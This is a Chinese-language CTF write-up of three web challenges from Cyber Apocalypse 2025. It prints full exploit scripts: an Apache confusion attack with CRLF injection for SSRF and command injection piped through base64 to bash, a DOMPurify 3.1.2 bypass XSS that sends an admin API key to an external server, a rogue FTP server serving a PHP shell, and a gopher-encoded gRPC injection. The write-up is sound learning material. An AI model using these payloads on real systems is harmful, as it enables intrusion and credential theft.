---
title: Cyber-Apocalypse-CTF-2025 WEB Writeup
date: 2025-04-03
categories: [CTF]
tags: [web, confusion attack, csrf, xss, ruby, grpc]
pin: false
math: true
mermaid: true
mermaid: true
image:
  path: /assets/images/Cyber-Apocalypse-CTF-2025.jpg
  alt: Cyber-Apocalypse-CTF-2025
---

## Cyber Attack
题目使用 apache2 作为服务端，配置文件中对特定的 cgi 进行了访问控制。
```xml
ServerName CyberAttack 

AddType application/x-httpd-php .php

<Location "/cgi-bin/attack-ip"> 
    Order deny,allow
    Deny from all
    Allow from 127.0.0.1
    Allow from ::1
</Location>
```
cgi-bin 下给出了两个 python cgi 文件：
1. attack-domain.py：对用户输入的 IP 进行正则匹配过滤，然后调用 os 执行 ping 命令，虽然直接拼接 IP，但由于正则表达式比较严格，无法直接命令注入。
2. attack-ip.py：使用 python ipaddress 库的 ip_address 函数进行 ip 地址过滤，然后拼接命令。该 CGI 仅允许本地访问。

attack-domain.py
```py
#!/usr/bin/env python3

import cgi
import os
import re

def is_domain(target):
    return re.match(r'^(?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.[a-zA-Z]{2,63}$', target)

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')
if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
    
elif is_domain(target):
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {target}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
else:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()
```

attack-ip.py
```py
#!/usr/bin/env python3

import cgi
import os
from ipaddress import ip_address

form = cgi.FieldStorage()
name = form.getvalue('name')
target = form.getvalue('target')

if not name or not target:
    print('Location: ../?error=Hey, you need to provide a name and a target!')
try:
    count = 1 # Increase this for an actual attack
    os.popen(f'ping -c {count} {ip_address(target)}') 
    print(f'Location: ../?result=Succesfully attacked {target}!')
except:
    print(f'Location: ../?error=Hey {name}, watch it!')
    
print('Content-Type: text/html')
print()

```
根据场景可以判断这道题需要通过 SSRF 访问 attack-ip 然后绕过 ip_address 达成命令注入。

如何进行 SSRF？由于服务使用的 apache2 版本较低（2.4.54），可以考虑 Confusion Attacks。
- [(繁中) Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! - Orange Tsai](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-2-2-3-Local-Gadget-to-LFI)

配合 CRLF，即可调用任意模块 Handler。调用 proxy 模块即可达成 SSRF。

attack-domain.py 在处理参数 name 时恰好直接拼接在 Location 头中，因此存在 CRLF 注入。

SSRF payload 如下：
```http
GET /cgi-bin/attack-domain?target=127.0.0.1&name=%0d%0aLocation:/ooo%0d%0aContent-Type:proxy:http://localhost/cgi-bin/attack-ip?name=aaa%26target=localhost%0d%0a%0d%0aDUMKIY: HTTP/1.1
Host: 192.168.85.128:1337
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: squirrelmail_language=deleted
If-None-Match: W/"646-195719c46b0"
If-Modified-Since: Fri, 07 Mar 2025 17:17:02 GMT
Connection: keep-alive


```
下一步就是绕过 ip_address 对于 ip 地址的解析。ip_address 可以解析 IPv4 和 IPv6 地址，在IPv6标准中，% 符号用于指定接口标识符，通常用于链路本地地址。例如 fe80::1%eth0 表示在 eth0 接口上的链路本地地址。
- ::1 是有效的IPv6回环地址
- % 被解释为范围标识符的开始
- 范围标识符后的任何内容被视为该标识符的一部分

根据这一特性可以在 % 后拼接任意字符，测试脚本如下：
```py
from ipaddress import ip_address
import os

count = 1
target = '::1%; echo "Y2F0IC9mbGFnKiA+IC90bXAvcHduZWQ=" | base64 -d | bash'
try:
    os.popen(f'ping -c {count} {ip_address(target)}') 
except Exception as e:
    print(e)
```

最终 poc 如下：
```py
from requests import get
url = 'http://192.168.85.128:1338'
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def quote(s):
    return ''.join([f'%{hex(ord(c))[2:]}' for c in s])
def dquote(s):
    return quote(quote(s))

from base64 import b64encode
payload = b64encode(b'cat /flag* > /var/www/html/flag.txt').decode()

handler = f'proxy:http://127.0.0.1/cgi-bin/attack-ip?name=asfs{quote('&')}target=::1{dquote(f"%; echo \"{payload}\" | base64 -d | bash")}{quote('&')}dummy='

get(f'{url}/cgi-bin/attack-domain?target=test&name=asdfasfd%0d%0aLocation:/as%0d%0aContent-Type:{handler}%0d%0a%0d%0a', proxies=proxies)

print(get(f'{url}/flag.txt', proxies=proxies).text)
```

## Eldoria panel

题目使用 nginx + php-fpm 作为服务端，web 框架为 slim，src 目录结构如下：
```
│  composer.json
│
├─data
├─public
├─src
│  │  bootstrap.php
│  │  routes.php
│  │  seed.php
│  │  settings.php
│  │
│  └─bot
│          requirements.txt
│          run_bot.py
│
└─templates
        admin.php
        claim_quest.php
        dashboard.php
        login.php
        quest_details.php
        register.php
```
分析题目的源码，服务端提供了一批 api 以及一个 bot。
1. 普通用户可以访问的路由为有
   1. /api/logout
   2. /api/login
   3. /api/register：注册接口仅能注册为普通用户
   4. /api/updateStatus：更新 session 中的 status 参数
   5. /api/announcement
   6. /api/quests
   7. /api/quest
   8. /api/claimQuest：提交一个 url，bot 会以 admin 身份登录，然后访问我们给出的 url。
2. admin 用户才可以访问的路由有。
   1. /api/admin/appSettings：可以更改 app 设置，比如模板路径
   2. /api/admin/cleanDatabase：清理非 admin 数据
   3. /api/admin/updateAnnouncement：修改 announcement 数据

根据架构可以判断题目大致的利用思路为 xss 获取 admin 权限，然后通过 admin api 来 RCE。

RCE 这一步比较明显：

/api/admin/appSettings 可以更改 `$GLOBALS['settings']['templatesPath']`，该参数被 render 函数用于加载模板，而 render 函数较为危险：
```php
function render($filePath) {
    if (!file_exists($filePath)) {
        return "Error: File not found.";
    }
    $phpCode = file_get_contents($filePath);
    ob_start();
    eval("?>" . $phpCode);
    return ob_get_clean();
}
```
通过 file_get_contents 来获取文件内容然后 eval 执行，一旦将 filePath 更改为远程路径，就可以达成任意代码执行。不过这里要注意 file_exists 会判断文件是否存在，http 路径无法通过校验，但 ftp 路径可以。

审计普通用户的 api，/api/updateStatus 用于更改 dashboard 页面中的 status 参数。

dashboard.php 中可以看到对 status 使用 DOMPurify 进行过滤。
```js
const cleanStatus = DOMPurify.sanitize(user.status || 'Ready for adventure!', {
USE_PROFILES: { html: true },
ALLOWED_TAGS: ['a', 'b', 'i', 'em', 'strong', 'span', 'br'],
FORBID_TAGS: ['svg', 'math'],
FORBID_CONTENTS: ['']
});

document.getElementById('heroStatus').innerHTML = cleanStatus;
```
DOMPurify 有两篇非常全面的文章：
- [Exploring the DOMPurify library: Bypasses and Fixes (1/2) - mizu.re](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes)
- [Exploring the DOMPurify library: Hunting for Misconfigurations (2/2) - mizu.re](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations)

题目 DOMPurify 版本为 3.1.2，且过滤手段与文章中 dompurify-2.3.1-3.1.2-specific-bypass 这部分的场景几乎一致，对 svg 和 math 标签进行限制。
```json
{
    "FORBID_TAGS": ["svg","math"],
    "FORBID_CONTENTS": [""]
}
```
对应的 payload 如下：
```html
<form id="x "><svg><style><a id="</style><img src=x onerror=alert(1)>"></a></style></svg></form><input form="x" name="namespaceURI">
```
测试链接：[Dom-Explorer](https://yeswehack.github.io/Dom-Explorer/#eyJpbnB1dCI6Ijxmb3JtIGlkPVwieCBcIj5cbjxzdmc+PHN0eWxlPjxhIGlkPVwiPC9zdHlsZT48aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoMSk+XCI+PC9hPjwvc3R5bGU+PC9zdmc+XG48L2Zvcm0+XG48aW5wdXQgZm9ybT1cInhcIiBuYW1lPVwibmFtZXNwYWNlVVJJXCI+IiwicGlwZWxpbmVzIjpbeyJpZCI6Imszdm0zemQ5IiwibmFtZSI6IkRvbSBUcmVlIiwicGlwZXMiOlt7Im5hbWUiOiJEb21QdXJpZnkiLCJpZCI6ImNqaTBvMXM0IiwiaGlkZSI6dHJ1ZSwic2tpcCI6ZmFsc2UsIm9wdHMiOnsidmVyc2lvbiI6IjMuMS4yIiwib3B0aW9ucyI6IntcbiAgICBGT1JCSURfVEFHUzogW1wic3ZnXCIsXCJtYXRoXCJdLFxuICAgIEZPUkJJRF9DT05URU5UUzogW1wiXCJdXG59IiwiaG9va3MiOiJmdW5jdGlvbihkb21QdXJpZnkpeyBcbiAgZG9tUHVyaWZ5LnJlbW92ZUFsbEhvb2tzKClcbiAgLy8gLi4uXG59In19LHsibmFtZSI6IkRvbVBhcnNlciIsImlkIjoibWt3dHRpaXAiLCJoaWRlIjpmYWxzZSwic2tpcCI6ZmFsc2UsIm9wdHMiOnsidHlwZSI6InRleHQvaHRtbCIsInNlbGVjdG9yIjoiYm9keSIsIm91dHB1dCI6ImlubmVySFRNTCIsImFkZERvY3R5cGUiOnRydWV9fV19XX0=)

由于 dashboard 中存放有 apiKey，因此 XSS 触发之后，将该内容带出来就可以获取 admin 的权限。
```html
<div class="bg-black/50 p-4 retro-border mb-6">
<p class="text-sm mb-2" style="color: var(--accent)">DRAGON'S HEART API KEY</p>
<p class="font-mono" style="color: var(--accent)" id="apiKey">Loading...</p>
</div>
```

但这里有一个关键的问题，status 参数是每个用户独有的，因此即使能够造成 XSS，也仅仅是一个 self XSS，如何转换成一个完整的 XSS 呢？

self XSS 的利用一般可以考虑结合 CSRF 或者缓存投毒等利用手法，src 代码中没有明确使用缓存，因此可以往 CSRF 去考虑。bot 本身会我们的 url，相当于一个 CSRF。

因此可以将利用过程分为两步：
1. 第一次请求：让 bot 访问 /api/updateStatus 修改自己的 status。
2. 第二次请求：让 bot 访问 /dashboard，触发 XSS，然后将 dashboard 中的 apiKey 带出

由于题目没有其他的开源重定向漏洞，因此只能让 bot 先访问外部的 url，然后再访问 /api/updateStatus，由于该 api 接收的是 json 数据，因此需要考虑 CORS 的影响。

服务端本身并没有设置 CORS 响应头，因此如果我们要提交 Content-Type: application/json 的数据，会触发 CORS 预检，从而请求失败。

那么如何绕过这一限制呢？如果服务端没有严格限制 Content-Type: 为 application/json，那么就可以通过 form 表单（application/x-www-form-urlencoded）来构造一个 json 数据，使得服务端仍然将其作为 json 格式数据处理，比如下面的这个 payload。
```html
<html>
<form action="http://192.168.85.128:9999/api/updateStatus" method="POST" enctype="text/plain">
    <input type="hidden" name='{"status": "xss()","foo' value='":"b"}' />
</form>
<script>document.forms[0].submit();</script>
</html>
```
通过参数填充，将 form 表单为字段自动添加的 = 号吞掉。服务端接收到的请求为：
{% raw %}
```http
POST /api/updateStatus HTTP/1.1
Host: 192.168.85.128:9999
Content-Length: 32
Cache-Control: max-age=0
Accept-Language: zh-CN,zh;q=0.9
Origin: http://192.168.85.1:9999
Content-Type: text/plain
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.85.1:9999/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"status": "xss()","foo=":"b"}
```
{% endraw %}
在服务端层面，如果不对 Content-Type 进行严格限制，那么会将其当作正常的 json 请求处理。

而 /api/updateStatus 路由恰好没有严格的限制，仅仅是读取 post data，然后使用 json_decode 处理。 
```php
// POST /api/updateStatus
$app->post('/api/updateStatus', function (Request $request, Response $response, $args) {
	$data = json_decode($request->getBody()->getContents(), true);
	$newStatus = $data['status'] ?? '';
	if (!isset($_SESSION['user'])) {
		$result = ['status' => 'error', 'message' => 'Not authenticated'];
	} else {
		$_SESSION['user']['status'] = $newStatus;
		$pdo = $this->get('db');
		$stmt = $pdo->prepare("UPDATE users SET status = ? WHERE id = ?");
		$stmt->execute([$newStatus, $_SESSION['user']['id']]);
		$result = ['status' => 'updated', 'newStatus' => $newStatus];
	}
	$response->getBody()->write(json_encode($result));
	return $response->withHeader('Content-Type', 'application/json');
})->add($apiKeyMiddleware);
```

完整 exp 如下，需要注意各个 payload 提交时的转义。
{% raw %}
```py
import requests
from flask import Flask, Response, request
import flask
import time
import threading

from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer

session = requests.Session()
session.proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

CHALLENGE_URL = 'http://192.168.85.128:1337'
EXTERNAL_IP = '192.168.85.1'
EXTERNAL_PORT = 9999
EXTERNAL_URL = f'http://{EXTERNAL_IP}:{EXTERNAL_PORT}'
EXTERNAL_FTP_PORT = 2121
EXTERNAL_FTP_URL = f'ftp://{EXTERNAL_IP}:{EXTERNAL_FTP_PORT}'

USERNAME = "username"
PASSWORD = "password"

admin_api_key = ""
def start_server():
    app = Flask(__name__)

    @app.route('/')
    def index():
        html = f'''
<html>
<form action="http://127.0.0.1:9000/api/updateStatus" method="POST" enctype="text/plain">
    <input type="hidden" name='{{"status": "{xss()}","foo' value='":"b"}}' />
</form>
<script>document.forms[0].submit();</script>
</html>
'''
        res = Response(html, mimetype='text/html')
        res.headers['Content-Type'] = 'text/html'
        return res, 200
    
    @app.route('/data')
    def data():
        data = request.args.get('apiKey')
        print(f"[+] Get admin api key: {data}")
        
        global admin_api_key
        admin_api_key = data
        return "done", 200

    app.run(host='0.0.0.0', port=EXTERNAL_PORT, debug=False, threaded=True)

def start_ftp_server():
	with open("login.php", "w") as f:
		f.write("<?php system('cat /flag*'); ?>")

	authorizer = DummyAuthorizer()
	authorizer.add_anonymous(homedir=".", perm="elradfmw")

	handler = FTPHandler
	handler.authorizer = authorizer
	handler.passive_ports = range(50000, 51000) # enable on firewall

	ftp_address = ("0.0.0.0", EXTERNAL_FTP_PORT)
	ftp_server = FTPServer(ftp_address, handler)

	print("[+] Starting FTP server on port 2121...")
	ftp_server.serve_forever()


def register_user(session):
	print("[+] Registering new user")
	session.post(f'{CHALLENGE_URL}/api/register',
		json={"username": USERNAME, "password": PASSWORD})

def login_user(session):
	print("[+] Logging in user")
	session.post(f'{CHALLENGE_URL}/api/login',
		json={"username": USERNAME, "password": PASSWORD})

def xss():
    fetch_api_key_payload = f'''
    const apiKey = document.getElementById('apiKey').innerHTML;
    fetch("{EXTERNAL_URL}/data?apiKey=" + apiKey)
'''
    csrf_payload = []
    for i in fetch_api_key_payload:
        csrf_payload.append(str(ord(i)))
    
    csrf_payload = ','.join(csrf_payload)

    return f'<form id=\\"x \\"> <svg><style><a id=\\"</style><img src=x onerror=eval(String.fromCharCode({csrf_payload}))>\\"></a></style></svg> </form> <input form=\\"x\\" name=\\"namespaceURI\\">'


def inject_xss_payload(session):
    data = {
        "questId":"1",
        "questUrl": EXTERNAL_URL,
        "companions":0
    }
    print(f'[+] Inject xss Payload')
    session.post(f'{CHALLENGE_URL}/api/claimQuest', json=data)

def trigger_xss(session):
    data = {
        "questId":"1",
        "questUrl": "http://127.0.0.1:9000/dashboard",
        "companions":1
    }
    print(f'[+] Trigger xss')
    session.post(f'{CHALLENGE_URL}/api/claimQuest', json=data)

def modify_app_settings(session):
    data = {
        "template_path": EXTERNAL_FTP_URL
    }
    headers = {
        "X-Api-Key": admin_api_key
    }
    session.post(f'{CHALLENGE_URL}/api/admin/appSettings',json=data, headers=headers)

    print(f'[+] Modify app settings')

def get_flag(session):
    res = session.get(f'{CHALLENGE_URL}/')
    print(f'[+] Get flag: {res.text}')

if __name__ == '__main__':
    server = threading.Thread(target=start_server)
    server.start()

    ftp = threading.Thread(target=start_ftp_server)
    ftp.start()

    time.sleep(2)

    register_user(session)
    login_user(session)
    inject_xss_payload(session)
    time.sleep(15)
    trigger_xss(session)
    time.sleep(15)
    modify_app_settings(session)
    get_flag(session)
```
{% endraw %}
## Eldoria Realms
题目以 ruby 作为前端，golang 作为后端（监听 50051 端口，外部无法访问）两个服务间以 grpc 协议通信。

分析源码发现 golang 服务的 healthCheck 存在命令注入
```go
func healthCheck(ip string, port string) error {
	cmd := exec.Command("sh", "-c", "nc -zv "+ip+" "+port)
	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Printf("Health check failed: %v, output: %s", err, output)
		return fmt.Errorf("health check failed: %v", err)
	}

	log.Printf("Health check succeeded: output: %s", output)
	return nil
}
```
本地测试时，使用下面的 payload 即可 RCE，因此后续需要考虑如何通过 ruby 发送该请求。
```bash
grpcurl -plaintext -d '{
    "ip": "192.168.85.128",
    "port": "9999;touch /tmp/pwned"
}' 192.168.85.128:50051 live.LiveDataService.CheckHealth
```
ruby 服务中 Adventurer 的 recursive_merge 函数存在一个递归覆盖，用于设置 player 的信息。在 ruby 中，递归覆盖会产生类似 Js 原型链污染的情况，通常被叫做类污染，相关研究可见博客：[Class Pollution in Ruby: A Deep Dive into Exploiting Recursive Merges · Doyensec's Blog](https://blog.doyensec.com/2024/10/02/class-pollution-ruby.html)

题目的设计与文章中的场景基本一致。ruby 类污染可以覆盖任意类的任意属性。由于 Player 继承自 Adventurer，可以尝试覆盖 Adventurer 中的 realm_url 属性，然后在 /connect-realm 路由中触发 curl 调用

```bash
curl -X POST -H "Content-Type: application/json" -d '{"class":{"superclass":{"realm_url":"http://malicous.com"}}}' http://localhost:1337/merge-fates

curl http://localhost:1337/connect-realm
```

curl 可以通过 gopher 协议发送 grpc 报文，gopher 协议比较简单，将 tcp 消息转化为 url 编码后，前方添加一个下划线即可。可以使用 cyberchief find/replace
- [cyberchief](file:///E:/work/Tools/web/Others/CyberChef/CyberChef_v10.19.2/CyberChef_v10.19.2.html#recipe=Find_/_Replace(%7B'option':'Regex','string':'(..)'%7D,'%25$1',true,false,true,false)&input=NTA&ieol=CRLF)

首先需要抓取 grpc 报文，具体操作过程可参考 [bkubiak.github.io](https://bkubiak.github.io/grpc-raw-requests/)

最终 payload：
```bash
curl gopher://127.0.0.1:50051/_%50%52%49%20%2a%20%48%54%54%50%2f%32%2e%30%0d%0a%0d%0a%53%4d%0d%0a%0d%0a%00%00%00%04%00%00%00%00%00%00%00%65%01%04%00%00%00%01%83%86%45%98%62%83%77%2a%f9%cd%dc%b7%c6%91%ee%2d%9d%cc%42%b1%7a%72%93%ae%32%8e%84%cf%41%8f%0b%e2%5c%2e%3c%bb%cd%ae%11%3d%71%b0%01%b0%ff%5f%8b%1d%75%d0%62%0d%26%3d%4c%4d%65%64%7a%8a%9a%ca%c8%b4%c7%60%2b%b8%15%c1%40%02%74%65%86%4d%83%35%05%b1%1f%40%8e%9a%ca%c8%b0%c8%42%d6%95%8b%51%0f%21%aa%9b%83%9b%d9%ab%00%00%39%00%01%00%00%00%01%00%00%00%00%34%0a%09%31%32%37%2e%30%2e%30%2e%31%12%27%3b%63%70%20%2f%66%6c%61%67%2a%20%2f%61%70%70%2f%65%6c%64%6f%72%69%61%5f%61%70%69%2f%70%75%62%6c%69%63%2f%66%6c%61%67
```

注意到题目的 curl 版本为 7.70，属于一个比较老的版本，在较老的版本中，curl 支持在 gopher:// URL 中发送 %00，这也是题目的一个提示点。


## 参考
- [hackthebox/cyber-apocalypse-2025: Official writeups for Cyber Apocalypse CTF 2025: Tales from Eldoria](https://github.com/hackthebox/cyber-apocalypse-2025)
- [(繁中) Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server! - Orange Tsai](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/#%E2%9C%94%EF%B8%8F-2-2-3-Local-Gadget-to-LFI)
- [Exploring the DOMPurify library: Bypasses and Fixes (1/2) - mizu.re](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes)
- [Exploring the DOMPurify library: Hunting for Misconfigurations (2/2) - mizu.re](https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations)
- [bkubiak.github.io](https://bkubiak.github.io/grpc-raw-requests/)